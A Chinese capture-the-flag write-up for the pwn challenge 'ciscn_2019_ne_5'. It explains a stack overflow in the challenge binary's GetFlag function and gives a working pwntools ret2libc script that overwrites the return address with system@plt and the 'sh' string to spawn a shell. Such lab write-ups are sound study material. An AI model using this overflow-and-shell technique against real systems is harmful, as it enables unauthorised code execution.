---
title: "ciscn_2019_ne_5"
description: ""
date: 2023-04-07T12:39:30+08:00
lastmod: 2023-04-07T12:39:30+08:00
draft: false
images: []
type: docs
weight: 984
toc: true
---

## 0x01 分析

![bf5923137fbc556f2da88163eb82824a](images/bf5923137fbc556f2da88163eb82824a.png)  

AddLog函数可以输入128个字符

![d857853671e738873442d4b598368a0b](images/d857853671e738873442d4b598368a0b.png)  

再通过GetFlag函数就会被溢出

程序里有system函数，而且在程序里找到了 `sh` 字符串

![4a94f6025fd5beda04a829bf34d2a2a9](images/4a94f6025fd5beda04a829bf34d2a2a9.png)  

所以就是简单的ret2libc

## 0x02 Exploit

```python
from pwn import*
o = process("./pwn")
elf = ELF("./pwn")
sys_plt = elf.plt['system']
sh = next(elf.search(b"sh"))
o.sendline("administrator")
payload = b'a'*(0x48+4) + p32(sys_plt) + b'a'*4 + p32(sh)
o.sendline("1")
o.sendline(payload)
o.sendline("4")
o.interactive()

```

![2f2c98460a1f136a585a34bb8f54d894](images/2f2c98460a1f136a585a34bb8f54d894.png)  

自行调试
